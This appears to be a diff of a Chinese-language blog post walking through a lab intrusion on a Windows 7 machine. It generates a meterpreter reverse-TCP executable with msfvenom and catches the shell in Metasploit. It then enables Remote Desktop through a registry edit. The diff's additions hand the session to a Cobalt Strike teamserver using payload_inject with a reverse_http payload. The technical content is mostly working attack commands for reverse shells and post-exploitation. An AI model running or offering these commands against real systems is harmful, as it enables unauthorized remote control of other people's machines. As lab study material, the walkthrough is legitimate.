@@ -196,7 +196,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.8k 字
+      2k 字
     </span>
   
 
@@ -206,7 +206,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      21
+      23
        分钟
     </span>
   
@@ -248,7 +248,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2021年4月7日 上午
+                  本文最后更新于：2021年4月8日 上午
                 
               </p>
             
@@ -364,11 +364,16 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 这里的IP是攻击机也就是kali的ip，端口则是监听的端口：</span><br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.244.128 LPORT=6666 -f exe -o hhh.exe<br><span class="hljs-meta">#</span><span class="bash"> 生成完毕给他777权限：</span><br>chmod 777 hhh.exe<br></code></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/04/07/sIcoH1ZxDtWFORq.png" srcset="/img/loading.gif" alt="把他上传到win7"></p>
 <p>然后在msf接收这个反弹shell：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfconsole<br>use exploit/multi/handler     							# 进入模块<br>set payload windows/x64/meterpreter_reverse_tcp		   	# 设置payload模块<br>set payload windows/meterpreter/reverse_tcp     		#（上一个payload有问题，我们用这个）<br>set lhost 192.168.244.128     							# 设置kali的地址<br>set lport 6666        									# 设置监听的端口<br></code></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfconsole<br>use exploit/multi/handler     							# 进入模块<br>set payload windows/meterpreter/reverse_tcp     		# 设置payload模块<br>set lhost 192.168.244.128     							# 设置kali的地址<br>set lport 6666        									# 设置监听的端口<br></code></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/04/07/FmK9x4pGSjhtv2e.png" srcset="/img/loading.gif"></p>
 <p>然后在win7执行hhh.exe就可以拿到反弹shell了</p>
 <p><img src="https://i.loli.net/2021/04/07/mDq8K1uaRjpzTFy.png" srcset="/img/loading.gif"><br><a target="_blank" rel="noopener" href="https://www.mrwu.red/web/2674.html">msf后渗透利用命令|MrWu</a></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 也在shell里先打开3389端口，再远程连接：</span><br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f				 # 开启3389<br>netstat -ano |findstr 3389	 	# 查看端口是否打开<br><span class="hljs-meta">#</span><span class="bash"> 不过用这个方法再使用kali的rdesktop连接失败了--，大概是存在waf，还是回头使用ms好f了</span><br>exploit -j						# 把msf挂在后台运行<br>run getgui -e    				# msf开启远程桌面<br><span class="hljs-meta">#</span><span class="bash"> 远程连接！00</span><br>rdesktop 192.168.244.134<br></code></pre></td></tr></table></figure>
+<p>然后咱们可以用一下cs：<br>首先是要运行cs目录下的./teamserver(要有执行权限，可以先 chmod 777 teamserver)：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> ./teamserver 攻击机ip地址 连接的password</span><br>./teamserver 192.168.244.128 password1<br><span class="hljs-meta">#</span><span class="bash"> 然后再运行cs即可，ip和密码同上，用户名随便填</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/08/nbjhWA3XKlCfxFc.png" srcset="/img/loading.gif"></p>
+<p>再创建一个监听：<br><img src="https://i.loli.net/2021/04/08/KT2PJw73bE1IRGS.png" srcset="/img/loading.gif"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 然后再从msf操作设置payload进行反弹</span><br><span class="hljs-meta">#</span><span class="bash"> 首先退出上一个会话</span><br>background<br><span class="hljs-meta">#</span><span class="bash"> 然后进入另一个模块</span><br>use exploit/windows/local/payload_inject<br><span class="hljs-meta">#</span><span class="bash"> 进入之后设置payload</span><br>set payload windows/meterpreter/reverse_http    # 设置http的payload<br>set DisablePayloadHandler true   # payload_inject执行之后会在本地产生一个新的handler，设置为true表示不重复生成<br>set lhost 192.168.244.134     	# 公网的ip（搭建CS那个主机ip）<br>set lport 7777        			# 监听的端口<br>set session 1      				# 设置会话id<br></code></pre></td></tr></table></figure>
 
             </div>
             <hr>
